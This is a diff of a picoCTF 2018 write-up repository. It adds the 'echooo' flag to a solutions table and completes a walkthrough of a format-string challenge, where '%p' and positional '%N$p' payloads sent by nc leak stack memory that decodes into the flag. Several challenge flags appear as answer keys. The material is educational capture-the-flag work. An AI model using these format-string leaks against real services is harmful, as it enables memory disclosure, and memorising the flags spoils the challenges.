@@ -73,7 +73,7 @@ rsa-madlibs                  Cryptography     250     picoCTF{d0_u_kn0w_th3_w@y_
 in out error                 General Skills   275     picoCTF{p1p1ng_1S_4_7h1ng_b6f5a788}
 Artisinal Handcrafted HTTP 3 Web              300     picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2}
 SpyFi                        Cryptography     300     picoCTF{@g3nt6_1$_th3_c00l3$t_3355197}
-echooo                       Binary           300
+echooo                       Binary           300     picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}
 learn gdb                    General Skills   300     picoCTF{gDb_iS_sUp3r_u53fuL_66d5464d}
 Flaskcards                   Web              350
 got-shell?                   Binary           350
@@ -3173,11 +3173,11 @@ since we know that `picoCTF` is `7069636f435446` in hex, we should be able to sp
 
 
 ```
-$ python -c "print('%p'*50)" | nc 2018shell1.picoctf.com 23397
+$ python -c "print('%p'*32)" | nc 2018shell1.picoctf.com 23397
 Time to learn about Format Strings!
 We will evaluate any format string you give us with printf().
 See if you can get the flag!
-> 0x400xf779a5a00x80486470xf77d1a740x10xf77a94900xffc1c8a40xffc1c7ac0x4910x89990080x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6d526f660x735f74340x6e695274> p0x400xf779a5a00x80486470xf77d1a740x10xf77a94900xffc1c8a40xffc1c7ac0x4910x89990080x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570
+> 0x400xf779a5a00x80486470xf77d1a740x10xf77a94900xffc1c8a40xffc1c7ac0x4910x89990080x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6d526f660x735f74340x6e695274
 ```
 
 reformatted to make easier to read:
@@ -3193,7 +3193,7 @@ xf7760490
 0xfff4a2cc
 0x491
 0x81aa008
-0x70257025
+0x70257025   # our own input of %p repeatedly
 0x70257025
 0x70257025
 0x70257025
@@ -3214,19 +3214,6 @@ xf7760490
 0x6d526f66
 0x735f7434
 0x6e695274
-0x40
-0xf77265a0
-0x8048647
-0xf775da74
-0x1
-0xf7735490
-0xffeaeed4
-0xffeaeddc
-0x491
-0x88e1008
-0x25702570
-0x25702570
-0x25702570
 ..
 ```
 
@@ -3238,20 +3225,50 @@ ocip
 mRof
 s_t4
 niRt
-@
-```
-so
-
-```
-picoCTF{foRm4t_stRin@
 ```
 
-but end is missing?
+accounting for little endian this gives us:
 
+```
+picoCTF{foRm4t_stRin
+```
+
+but end is missing? our buffer isnt big enough to show us the whole flag, so we gotta be smarter about it.
+
+Passing a format string like `%42$p` will return the 42nd item on the stack
+
+```
+$ python -c "print(''.join(['%'+str(i)+'\$p' for i in range(27,39)]))" | nc 2018shell1.picoctf.com 23397                    [13-10-18 11:25:04]
+Time to learn about Format Strings!
+We will evaluate any format string you give us with printf().
+See if you can get the flag!
+> 0x6f6369700x7b4654430x6d526f660x735f74340x6e6952740x615f73470x445f65520x65476e610x737530720x3435325f0x613834310xa7d65
+```
+
+or with a bit of extra formatting:
+
+```
+$ python -c "print(''.join(['%'+str(i)+'\$p' for i in range(27,39)]))" | nc 2018shell1.picoctf.com 23397 |head -n 4 | tail -n 1 | sed 's/0x/\n0x/g' | python ../../_resources/code/l2a.py
+>
+0x6f636970 ocip
+0x7b465443 {FTC
+0x6d526f66 mRof
+0x735f7434 s_t4
+0x6e695274 niRt
+0x615f7347 a_sG
+0x445f6552 D_eR
+0x65476e61 eGna
+0x73753072 su0r
+0x3435325f 452_
+0x61383431 a841
+0xa7d65
+```
+
+the last line tranlslates to `e}` so full flag is:
 
 **Flag**
 ```
-
+picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}
 ```
 
 
